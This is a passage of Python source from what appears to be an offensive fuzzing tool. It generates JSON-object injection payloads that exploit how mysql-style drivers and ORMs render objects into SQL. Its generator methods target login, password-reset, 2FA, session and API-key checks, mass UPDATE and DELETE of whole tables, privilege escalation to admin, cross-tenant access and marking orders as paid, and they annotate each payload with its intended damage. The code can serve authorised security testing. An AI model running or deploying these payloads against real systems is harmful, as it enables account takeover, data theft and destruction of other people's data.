                    risk=Risk.CRITICAL, tags=["pdo_sql", "token", "auth"],
                    field_type=ft)
                if p: yield p
            # Cross-column token-ish columns
            for tp in TOKEN_FIELD_NAMES:
                if tp == f: continue
                obj = JsonEngine.replace_field(ctx.orig, f, {tp: 1})
                p = self.mk(sub,
                    f"Token cross-col {f}={{{tp}:1}}",
                    f, obj,
                    risk=Risk.HIGH, tags=["pdo_sql", "token", "cross_col"],
                    parser_targets=self.PARSER_TARGETS, field_type=ft)
                if p: yield p
            # Array variant
            obj = JsonEngine.replace_field(ctx.orig, f, [f, 1])
            p = self.mk(sub, f"Token array bypass {f}=[{f!r},1]", f, obj,
                       risk=Risk.CRITICAL, tags=["pdo_sql", "token", "array"],
                       field_type=ft)
            if p: yield p

    # ============= S05 — Password reset (paradigm from blog) ===============
    def _s05_password_reset(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "password_reset"
        # Always emit, even if orig doesn't already have a token field
        reset_fields = ["token", "reset_token", "resetToken",
                        "password_reset_token", "passwordResetToken", "code"]
        for rf in reset_fields:
            base = JsonEngine.deep_copy(ctx.orig)
            base[rf] = {rf: 1}
            # add a typical reset body
            if "email" not in base: base["email"] = "victim@example.com"
            if "password" not in base: base["password"] = "NewP@ssw0rd!"
            p = self.mk(sub,
                f"[BLOG] Password-reset endpoint, {rf}={{{rf}:1}} → all active tokens",
                rf, base,
                expected="WHERE reset_token=`reset_token`=1 AND expiry>NOW() → all unexpired",
                impact="Reset victim's password without ever knowing the token",
                parser_targets=self.PARSER_TARGETS,
                backend_targets=self.BACKEND_TARGETS,
                risk=Risk.CRITICAL,
                tags=["pdo_sql", "password_reset", "ato"], field_type=FieldType.TOKEN)
            if p: yield p
            # variant: expiry also bypassed
            base2 = JsonEngine.deep_copy(base)
            for expf in ("expiry", "expires_at", "valid_until"):
                base2[expf] = {expf: 1}
            p = self.mk(sub,
                f"[BLOG] Password reset + expiry bypass via {rf} + expiry chain",
                rf, base2,
                impact="Defeats both token validation AND expiry check",
                risk=Risk.CRITICAL,
                tags=["pdo_sql", "password_reset", "chain", "ato"],
                field_type=FieldType.TOKEN)
            if p: yield p

    # ============= S06 — Login bypass =======================================
    def _s06_login_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "login_bypass"
        creds = [("email", "victim@example.com"), ("username", "victim"),
                 ("login", "victim"), ("user", "victim")]
        for ident, ival in creds:
            obj = {ident: {ident: 1}, "password": {"password": 1}}
            p = self.mk(sub,
                f"Login bypass on {ident}/password (both self-ref)",
                ident, obj,
                expected="WHERE email=`email`=1 AND password=`password`=1 → first row wins",
                impact="Authenticate as the first matching user (often admin)",
                parser_targets=self.PARSER_TARGETS,
                backend_targets=self.BACKEND_TARGETS,
                risk=Risk.CRITICAL, tags=["pdo_sql", "login", "auth_bypass"],
                field_type=FieldType.USERNAME)
            if p: yield p
            # Cross-col: WHERE email=`role`=1 AND password=`is_admin`=1
            obj2 = {ident: {"role": "admin"}, "password": {"is_admin": 1}}
            p = self.mk(sub,
                f"Login bypass with role cross-col on {ident}",
                ident, obj2,
                impact="Targets the admin user specifically via role/is_admin column",
                risk=Risk.CRITICAL, tags=["pdo_sql", "login", "admin"],
                parser_targets=self.PARSER_TARGETS, field_type=FieldType.USERNAME)
            if p: yield p

    # ============= S07 — 2FA / MFA bypass ==================================
    def _s07_two_factor_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "two_factor_bypass"
        mfa_fields = ["otp", "otp_code", "code", "pin", "mfa_code",
                      "two_factor_code", "totp", "auth_code", "verification_code"]
        for mf in mfa_fields:
            base = JsonEngine.deep_copy(ctx.orig) if ctx.orig else {}
            base[mf] = {mf: 1}
            base.setdefault("user_id", 1)
            p = self.mk(sub,
                f"2FA/MFA bypass {mf}={{{mf}:1}}",
                mf, base,
                expected="WHERE otp=`otp`=1 → any unconsumed OTP matches",
                impact="MFA bypass during step-up auth",
                parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                tags=["pdo_sql", "2fa", "mfa", "auth_bypass"], field_type=FieldType.TOKEN)
            if p: yield p

    # ============= S08 — Session confusion =================================
    def _s08_session_confusion(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "session_confusion"
        for sf in ["session_id", "sessionId", "session_token", "sid"]:
            base = JsonEngine.deep_copy(ctx.orig)
            base[sf] = {sf: 1}
            p = self.mk(sub, f"Session-field bypass {sf}={{{sf}:1}}", sf, base,
                       impact="Hijack the first matching active session",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                       tags=["pdo_sql", "session", "auth"], field_type=FieldType.TOKEN)
            if p: yield p

    # ============= S09 — JWT field injection ===============================
    def _s09_jwt_field_injection(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "jwt_field"
        for jf in ["jwt", "id_token", "idToken", "access_token", "bearer"]:
            base = JsonEngine.deep_copy(ctx.orig)
            base[jf] = {jf: 1}
            p = self.mk(sub, f"JWT-field bypass {jf}={{{jf}:1}}", jf, base,
                       expected="Backend may look up sessions by JWT body field",
                       impact="Auth bypass on apps that DB-lookup JWTs by stored value",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "jwt"], field_type=FieldType.TOKEN)
            if p: yield p

    # ============= S10 — API key bypass ====================================
    def _s10_api_key_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "api_key"
        for kf in ["api_key", "apiKey", "api_token", "apiToken", "client_secret"]:
            base = JsonEngine.deep_copy(ctx.orig)
            base[kf] = {kf: 1}
            p = self.mk(sub, f"API-key field bypass {kf}={{{kf}:1}}", kf, base,
                       impact="Authenticate as the first active API key (often admin)",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                       tags=["pdo_sql", "api_key", "auth"], field_type=FieldType.TOKEN)
            if p: yield p

    # ============= S11 — Mass SELECT =======================================
    def _s11_mass_select(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "mass_select"
        for f in ctx.orig:
            if not ctx.is_targeted(f): continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for val, lbl in [(1, "1"), (True, "true")]:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: val})
                p = self.mk(sub, f"Mass SELECT via {f}={{{f}:{lbl}}}", f, obj,
                    expected="Endpoint returns every row instead of one",
                    impact="Data exfiltration via lookup endpoint",
                    parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                    tags=["pdo_sql", "mass", "select", "idor"], field_type=ft)
                if p: yield p
        for idf in ID_FIELD_NAMES:
            if idf in ctx.orig: continue
            obj = JsonEngine.inject_sibling(ctx.orig, idf, {idf: 1})
            p = self.mk(sub, f"Mass SELECT inject {idf}={{{idf}:1}}", idf, obj,
                       impact="Inject an ID-named field to drive WHERE clause",
                       risk=Risk.HIGH, tags=["pdo_sql", "mass", "inject"])
            if p: yield p

    # ============= S12 — Mass UPDATE =======================================
    def _s12_mass_update(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "mass_update"
        for f in ctx.orig:
            if not ctx.is_targeted(f): continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            obj = JsonEngine.replace_field(ctx.orig, f, {f: True})
            p = self.mk(sub, f"[BLOG] Mass UPDATE: {f}={{{f}:true}}", f, obj,
                expected="UPDATE ... WHERE field=`field`=true → every row updated",
                impact="Overwrite every row in the table",
                parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                tags=["pdo_sql", "mass", "update"], field_type=ft)
            if p: yield p
            # Cross-col variant
            for col in ("id", "user_id", "userId", "tenant_id"):
                if col == f: continue
                obj = JsonEngine.replace_field(ctx.orig, f, {col: 1})
                p = self.mk(sub, f"Mass UPDATE cross-col {f}={{{col}:1}}", f, obj,
                    risk=Risk.CRITICAL, tags=["pdo_sql", "mass", "update", "cross_col"],
                    parser_targets=self.PARSER_TARGETS, field_type=ft)
                if p: yield p

    # ============= S13 — Mass DELETE =======================================
    def _s13_mass_delete(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "mass_delete"
        for f in ctx.orig:
            if not ctx.is_targeted(f): continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            obj = JsonEngine.replace_field(ctx.orig, f, {f: True})
            p = self.mk(sub, f"[BLOG] Mass DELETE: {f}={{{f}:true}}", f, obj,
                impact="Wipes every record in the table",
                parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                tags=["pdo_sql", "mass", "delete"], field_type=ft)
            if p: yield p

    # ============= S14 — Mass invite ========================================
    def _s14_mass_invite(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "mass_invite"
        invite_body = {"email": {"email": 1}, "role": "admin",
                       "tenant_id": {"tenant_id": 1}}
        p = self.mk(sub, "Bulk-invite collab endpoint abuse", "email", invite_body,
                   impact="Invite every user in target tenant as admin",
                   parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                   tags=["pdo_sql", "mass", "invite", "privesc"],
                   field_type=FieldType.EMAIL)
        if p: yield p

    # ============= S15 — Mass share / permissions ==========================
    def _s15_mass_share(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "mass_share"
        body = {"resource_id": {"resource_id": 1},
                "shared_with": {"shared_with": 1}, "permission": "owner"}
        p = self.mk(sub, "Mass share / permission grant abuse",
                   "resource_id", body,
                   impact="Grant attacker access to every resource in the table",
                   parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                   tags=["pdo_sql", "mass", "share", "idor"])
        if p: yield p

    # ============= S16 — Privilege escalation ===============================
    def _s16_privilege_escalation(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "privilege_escalation"
        # Self-target the requester to escalate
        body: Dict[str, Any] = {"user_id": {"user_id": 1}, "role": "admin",
                                "is_admin": True, "permissions": ["*"]}
        p = self.mk(sub, "PrivEsc via user_id self-ref + mass role overwrite",
                   "user_id", body,
                   impact="Promote every user (incl. attacker) to admin",
                   parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                   tags=["pdo_sql", "privesc", "mass"])
        if p: yield p

    # ============= S17 — Tenant escape =====================================
    def _s17_tenant_escape(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "tenant_escape"
        for tf in ("tenant_id", "tenantId", "org_id", "orgId",
                   "workspace_id", "workspaceId"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[tf] = {tf: 1}
            p = self.mk(sub, f"Tenant escape via {tf}={{{tf}:1}}", tf, body,
                       impact="Bypass tenant scoping; access cross-tenant data",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                       tags=["pdo_sql", "tenant", "multi_tenant"])
            if p: yield p

    # ============= S18 — Org escape ========================================
    def _s18_org_escape(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "org_escape"
        for of in ("organization_id", "company_id", "account_id"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[of] = {of: 1}
            p = self.mk(sub, f"Org escape via {of}={{{of}:1}}", of, body,
                       impact="Cross-organization data access",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "org"])
            if p: yield p

    # ============= S19 — Workspace escape ==================================
    def _s19_workspace_escape(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "workspace_escape"
        for wf in ("workspace_id", "project_id", "team_id"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[wf] = {wf: 1}
            p = self.mk(sub, f"Workspace escape via {wf}={{{wf}:1}}", wf, body,
                       impact="Cross-workspace / cross-project data access",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "workspace"])
            if p: yield p

    # ============= S20 — Chained-condition bypass ==========================
    def _s20_chained_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "chained_bypass"
        secondary = [
            ("expiry", 1), ("expires_at", 1), ("valid_until", 1),
            ("active", 1), ("enabled", 1), ("is_active", 1),
            ("verified", 1), ("approved", 1),
            ("deleted", 0), ("is_deleted", 0), ("disabled", 0),
            ("status", 1), ("state", 1),
        ]
        for f in ctx.orig:
            primary = {f: 1}
            for sf, sv in secondary:
                if sf in ctx.orig: continue
                body = JsonEngine.deep_copy(ctx.orig)
                body[f]  = primary
                body[sf] = {sf: sv}
                p = self.mk(sub,
                    f"Chain bypass {f}+{sf}: both WHERE conditions always true",
                    f, body,
                    impact="Defeats secondary validity / expiry / status checks",
                    parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                    tags=["pdo_sql", "chain"])
                if p: yield p
            if len(ctx.orig) > 1:
                body = {k: {k: 1} for k in ctx.orig}
                p = self.mk(sub, f"Full chain on all original fields", "*", body,
                           impact="Every WHERE condition trivially true",
                           risk=Risk.CRITICAL, tags=["pdo_sql", "chain", "full"],
                           parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S21 — Boolean coercion grid =============================
    def _s21_boolean_coercion(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "bool_coercion"
        truthy: List[Any] = [1, 2, -1, 100, 9999, 1.0, 0.1, 1.5, True, "1", "true",
                             "1=1", "OR 1"]
        falsy: List[Any]  = [0, 0.0, False, None, "", "0", "false", "null"]
        for f in ctx.orig:
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for tv in truthy:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: tv})
                p = self.mk(sub, f"TRUE coercion {f}={{{f}:{tv!r}}}", f, obj,
                           expected="WHERE col=`col`=truthy → matches all",
                           risk=Risk.HIGH, tags=["pdo_sql", "coercion", "true"],
                           parser_targets=self.PARSER_TARGETS, field_type=ft)
                if p: yield p
            for fv in falsy:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: fv})
                p = self.mk(sub, f"FALSE probe {f}={{{f}:{fv!r}}}", f, obj,
                           expected="WHERE col=`col`=falsy → no rows (diff probe)",
                           risk=Risk.INFO, tags=["pdo_sql", "coercion", "false"],
                           parser_targets=self.PARSER_TARGETS, field_type=ft)
                if p: yield p

    # ============= S22 — SQL keyword keys ==================================
    def _s22_sql_keyword_keys(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "sql_keyword_keys"
        for f in ctx.orig:
            for sk in SQL_KEYWORD_KEYS:
                obj = JsonEngine.replace_field(ctx.orig, f, {sk: 1})
                p = self.mk(sub, f"SQL keyword key '{sk}' on {f}",
                    f, obj,
                    expected=f"Driver renders `{sk}`=1 — may emit unusual but valid SQL",
                    risk=Risk.HIGH, tags=["pdo_sql", "sql_keyword"],
                    parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S23 — Nested-object variants ============================
    def _s23_nested_variants(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "nested_variants"
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f, {f: {f: {f: 1}}})
            p = self.mk(sub, f"Triple-nested self-ref on {f}", f, obj,
                       risk=Risk.MEDIUM, tags=["pdo_sql", "nested"])
            if p: yield p
            obj = JsonEngine.replace_field(ctx.orig, f, {f: [{f: 1}]})
            p = self.mk(sub, f"Obj-of-array-of-obj on {f}", f, obj,
                       risk=Risk.MEDIUM, tags=["pdo_sql", "nested", "array"])
            if p: yield p

    # ============= S24 — Empty / numeric keys ==============================
    def _s24_empty_and_numeric_keys(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "empty_numeric_keys"
        for f in ctx.orig:
            for k, lbl in [("", "empty key"), ("1", "numeric key '1'"),
                           ("0", "zero key"), (" ", "space key")]:
                obj = JsonEngine.replace_field(ctx.orig, f, {k: 1})
                p = self.mk(sub, f"{lbl} on {f}: {{'{k}':1}}", f, obj,
                           risk=Risk.MEDIUM, tags=["pdo_sql", "edge_keys"],
                           parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S25 — Multi-key object renders ==========================
    def _s25_multi_key_objects(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "multi_key_object"
        for f in ctx.orig:
            for combo in [
                {f: 1, "id": 1},
                {"email": 1, "password": 1},
                {"id": 1, "role": "admin"},
                {f: 1, "verified": True},
                {f: 1, "is_admin": 1},
                {"is_admin": 1, "role": "admin"},
            ]:
                obj = JsonEngine.replace_field(ctx.orig, f, combo)
                p = self.mk(sub, f"Multi-key {combo} on {f}", f, obj,
                           expected="Driver emits comma-separated SQL fragments",
                           risk=Risk.HIGH, tags=["pdo_sql", "multi_key"],
                           parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S26 — Soft-delete bypass =================================
    def _s26_soft_delete_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "soft_delete_bypass"
        for sf in ("deleted", "is_deleted", "isDeleted", "deleted_at", "removed"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[sf] = {sf: 0}      # WHERE deleted=`deleted`=0 → trivially true
            p = self.mk(sub, f"Soft-delete bypass {sf}={{{sf}:0}}", sf, body,
                       impact="Resurfaces soft-deleted (and 'removed') records",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "soft_delete"])
            if p: yield p

    # ============= S27 — Coupon / discount abuse ===========================
    def _s27_coupon_abuse(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "coupon_abuse"
        body = {"code": {"code": 1}, "valid_until": {"valid_until": 1},
                "max_uses": {"max_uses": 1}, "used": {"used": 0}}
        p = self.mk(sub, "Coupon/discount full-chain bypass", "code", body,
                   impact="Apply expired / single-use coupons unconditionally",
                   parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                   tags=["pdo_sql", "coupon", "ecommerce"])
        if p: yield p

    # ============= S28 — Order / payment ====================================
    def _s28_order_payment_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "order_payment"
        body = {"order_id": {"order_id": 1}, "status": "paid",
                "payment_status": {"payment_status": 1}}
        p = self.mk(sub, "Order/payment mass-confirm via self-ref + status", "order_id",
                   body, impact="Mark every order as paid",
                   parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                   tags=["pdo_sql", "payment", "ecommerce", "mass"])
        if p: yield p

    # ============= S29 — Listing filter bypass ==============================
    def _s29_filter_listing_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "filter_bypass"
        for filt in ("status", "category", "type", "is_public", "visibility"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[filt] = {filt: 1}
            p = self.mk(sub, f"Listing filter bypass {filt}", filt, body,
                       impact="Defeats public/private/visibility filter on list endpoint",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "listing"])
            if p: yield p

    # ============= S30 — Search field bypass ================================
    def _s30_search_field_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "search_bypass"
        for sf in ("q", "query", "search", "term", "keyword"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[sf] = {sf: 1}
            p = self.mk(sub, f"Search-field PDO Sql on {sf}", sf, body,
                       impact="Force full-table dump from search endpoint",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "search"])
            if p: yield p

    # ============= S31 — ORDER BY injection =================================
    def _s31_order_by_injection(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "order_by"
        for of in ("sort", "order", "order_by", "orderBy", "sort_by"):
            for val in [{"id": "DESC"}, {"password": "ASC"},
                        ["password", "DESC"], {"1": 1}]:
                body = JsonEngine.deep_copy(ctx.orig)
                body[of] = val
                p = self.mk(sub, f"ORDER BY injection {of}={val!r}", of, body,
                       expected="ORM may interpolate object/array into ORDER BY",
                       impact="Boolean-ordered data exfil (sort by sensitive col)",
                       parser_targets=self.PARSER_TARGETS, risk=Risk.HIGH,
                       tags=["pdo_sql", "order_by"])
                if p: yield p

    # ============= S32 — LIMIT/OFFSET injection =============================
    def _s32_limit_offset_injection(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "limit_offset"
        for lf in ("limit", "page_size", "per_page"):
            for val in [{"limit": 999999}, [999999, 0], {"1": 1}, -1, 0]:
                body = JsonEngine.deep_copy(ctx.orig)
                body[lf] = val
                p = self.mk(sub, f"LIMIT injection {lf}={val!r}", lf, body,
                           impact="Return enormous result sets bypassing pagination",
                           risk=Risk.MEDIUM, tags=["pdo_sql", "limit"],
                           parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S33 — IN-clause poisoning =================================
    def _s33_in_clause_poisoning(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "in_clause"
        for f in ctx.orig:
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for arr in [
                [1, 2, 3, 4, 5],
                [{f: 1}, {f: 2}],
                [None, True, 1, "1", ""],
                ["%", "_", "*", ".*"],
                list(range(0, 100)),
            ]:
                obj = JsonEngine.replace_field(ctx.orig, f, arr)
                p = self.mk(sub, f"IN-clause poisoning {f}={arr!r}",
                           f, obj, risk=Risk.MEDIUM, tags=["pdo_sql", "in_clause"],
                           parser_targets=self.PARSER_TARGETS, field_type=ft)
                if p: yield p

    # ============= S34 — Comparison-operator confusion ======================
    def _s34_comparison_confusion(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "comparison_confusion"
        for f in ctx.orig:
            for op_obj in [
                {">": 0}, {"<": 999999}, {">=": 0}, {"<=": 999999},
                {"!=": -1}, {"<>": -1}, {"BETWEEN": [0, 99999]},
                {"LIKE": "%"}, {"RLIKE": ".*"}, {"NOT": 0},
            ]:
                obj = JsonEngine.replace_field(ctx.orig, f, op_obj)
                p = self.mk(sub, f"Comparison op {op_obj} on {f}",
                           f, obj, risk=Risk.MEDIUM,
                           tags=["pdo_sql", "comparison"],
                           parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S35 — Bulk operations ====================================
    def _s35_bulk_operations(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "bulk_ops"
        for op_field in ("ids", "items", "records", "users", "entries"):
            for shape in [
                [{"id": {"id": 1}}],
                [{"id": 1}, {"id": {"id": 1}}],
                {"id": {"id": 1}},
            ]:
                body = JsonEngine.deep_copy(ctx.orig)
                body[op_field] = shape
                p = self.mk(sub, f"Bulk-op {op_field}={shape!r}",
                           op_field, body,
                           impact="Apply bulk operation to every row",
                           risk=Risk.CRITICAL, tags=["pdo_sql", "bulk", "mass"],
                           parser_targets=self.PARSER_TARGETS)
                if p: yield p

    # ============= S36 — GraphQL variable injection ========================
    def _s36_graphql_variable_injection(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "graphql_vars"
        gql = {
            "query": "query($id:ID!){ user(id:$id){ id email role } }",
            "variables": {"id": {"id": 1}},
        }
        p = self.mk(sub, "GraphQL variable PDO Sql on $id", "variables.id", gql,
                   impact="Resolver passes the object straight to mysql2 → mass read",
                   parser_targets=["GraphQL → mysql2", "Apollo Server"],
                   risk=Risk.CRITICAL, tags=["pdo_sql", "graphql"])
        if p: yield p
        gql2 = {
            "query": "mutation($t:String!){ resetPassword(token:$t) }",
            "variables": {"t": {"t": 1}},
        }
        p = self.mk(sub, "GraphQL variable PDO Sql on token mutation", "variables.t",
                   gql2, impact="Same primitive, on GraphQL mutation",
                   parser_targets=["GraphQL → mysql2"], risk=Risk.CRITICAL,
                   tags=["pdo_sql", "graphql", "mutation"])
        if p: yield p

    # ============= S37 — ORM-operator-aware variants =======================
    def _s37_orm_operator_aware(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "orm_operator"
        # Sequelize Op.*
        for f in ctx.orig:
            for sk, sv in [("$or", [{f: 1}, {"id": {"$gt": 0}}]),
                           ("$and", [{f: 1}]),
                           ("$not", {f: 1}),
                           ("$in", [{f: 1}, {f: True}])]:
                obj = JsonEngine.replace_field(ctx.orig, f, {sk: sv})
                p = self.mk(sub, f"Sequelize Op {sk} on {f}", f, obj,
                           impact="Forces Sequelize to emit unintended SQL",
                           parser_targets=["Sequelize"], risk=Risk.HIGH,
                           tags=["pdo_sql", "orm", "sequelize"])
                if p: yield p
            # Prisma where{} construct
            obj = JsonEngine.replace_field(ctx.orig, f, {"in": [f, 1]})
            p = self.mk(sub, f"Prisma 'in' object on {f}", f, obj,
                       parser_targets=["Prisma"], risk=Risk.HIGH,
                       tags=["pdo_sql", "orm", "prisma"])
            if p: yield p
            # TypeORM raw
            obj = JsonEngine.replace_field(ctx.orig, f, {"raw": "1=1"})
            p = self.mk(sub, f"TypeORM raw injection on {f}", f, obj,
                       parser_targets=["TypeORM"], risk=Risk.HIGH,
                       tags=["pdo_sql", "orm", "typeorm", "raw"])
            if p: yield p

    # ============= S38 — Prototype pollution combo =========================
    def _s38_prototype_pollution_combo(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "prototype_combo"
        for proto in ("__proto__", "constructor", "prototype"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[proto] = {"is_admin": True, "role": "admin"}
            p = self.mk(sub, f"{proto} pollution + role promotion", proto, body,
                       impact="Prototype pollution promotes attacker to admin",
                       risk=Risk.CRITICAL, tags=["pdo_sql", "prototype", "privesc"])
            if p: yield p
            # combo with self-ref
            body2 = JsonEngine.deep_copy(ctx.orig)
            body2[proto] = {"id": {"id": 1}, "is_admin": True}
            p = self.mk(sub, f"{proto} pollution + self-ref id + admin", proto, body2,
                       impact="Combine prototype pollution with PDO Sql row-match",
                       risk=Risk.CRITICAL,
                       tags=["pdo_sql", "prototype", "privesc", "combo"])
            if p: yield p

    # ============= S39 — Mass-assignment combo =============================
    def _s39_mass_assignment_combo(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "mass_assignment_combo"
        if not ctx.orig:
            return
        body = JsonEngine.deep_copy(ctx.orig)
        # PDO Sql on first field + add admin flags
        first = next(iter(ctx.orig))
        body[first] = {first: 1}
        body.update({"role": "admin", "is_admin": True, "verified": True,
                     "permissions": ["*"], "tier": "enterprise"})
        p = self.mk(sub, "Mass-assignment privileged flags + PDO Sql row match",
                   first, body,
                   impact="Escalate every matching user — including self — to admin",
                   parser_targets=self.PARSER_TARGETS, risk=Risk.CRITICAL,
                   tags=["pdo_sql", "mass_assign", "privesc", "combo"])
        if p: yield p

    # ============= S40 — Unicode field-name confusion ======================
    def _s40_unicode_field_confusion(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "unicode_field"
        for f in ctx.orig:
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            # zero-width-spaced variant of the field name
            for zw in ZERO_WIDTH:
                weird = f[:1] + zw + f[1:] if len(f) > 1 else f + zw
                body = JsonEngine.deep_copy(ctx.orig)
                body[weird] = {f: 1}      # actual PDO Sql injection under disguised key
                p = self.mk(sub,
                    f"Zero-width-disguised key '{weird!r}' carrying PDO Sql on {f}",
                    f, body,
                    impact="Bypasses denylist on field name; ORM sees the visible key",
                    risk=Risk.MEDIUM, tags=["pdo_sql", "unicode"], field_type=ft)
                if p: yield p
            # homoglyph variant
            mapped = "".join(HOMOGLYPHS.get(c, c) for c in f[:1]) + f[1:]
            if mapped != f:
                body = JsonEngine.deep_copy(ctx.orig)
                body[mapped] = {f: 1}
                p = self.mk(sub, f"Homoglyph key '{mapped}' carrying PDO Sql on {f}",
                           f, body, risk=Risk.MEDIUM,
                           tags=["pdo_sql", "unicode", "homoglyph"], field_type=ft)
                if p: yield p

    # ============= S41 — toString-object bypass ============================
    def _s41_toString_object_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "toString_bypass"
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f, {"toString": "1"})
            p = self.mk(sub, f"toString-object on {f}", f, obj,
                       expected="JS String(obj) → obj.toString() → '1' (driver may stringify)",
                       impact="Some drivers stringify objects via toString — passes filter",
                       parser_targets=["mysql", "mysql2", "Sequelize"],
                       risk=Risk.MEDIUM, tags=["pdo_sql", "toString"])
            if p: yield p
            obj = JsonEngine.replace_field(ctx.orig, f, {"valueOf": 1})
            p = self.mk(sub, f"valueOf-object on {f}", f, obj,
                       parser_targets=["mysql", "mysql2"],
                       risk=Risk.MEDIUM, tags=["pdo_sql", "valueOf"])
            if p: yield p

    # ============= S42 — Negative ID bypass ================================
    def _s42_negative_id_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "negative_id"
        for f, v in ctx.orig.items():
            if not isinstance(v, (int, float)): continue
            for neg in [-1, -0, -2147483648, -9999999999]:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: neg})
                p = self.mk(sub, f"Negative-ID self-ref {f}={{{f}:{neg}}}", f, obj,
                           risk=Risk.MEDIUM, tags=["pdo_sql", "negative"],
                           parser_targets=self.PARSER_TARGETS,
                           field_type=ctx.field_types.get(f, FieldType.INTEGER))
                if p: yield p

    # ============= S43 — UUID-zero bypass ==================================
    def _s43_uuid_zero_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "uuid_zero"
        for f, v in ctx.orig.items():
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            if ft != FieldType.UUID and not (isinstance(v, str) and _UUID_VALUE_RE.match(v)):
                continue
            for fake in ["00000000-0000-0000-0000-000000000000",
                         "ffffffff-ffff-ffff-ffff-ffffffffffff",
                         "11111111-1111-1111-1111-111111111111"]:
                obj = JsonEngine.replace_field(ctx.orig, f, {f: fake})
                p = self.mk(sub, f"UUID-zero/sentinel self-ref {f}={fake}", f, obj,
                           risk=Risk.MEDIUM, tags=["pdo_sql", "uuid"],
                           parser_targets=self.PARSER_TARGETS, field_type=ft)
                if p: yield p

    # ============= S44 — Expiry window bypass ==============================
    def _s44_expiry_window_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "expiry_window"
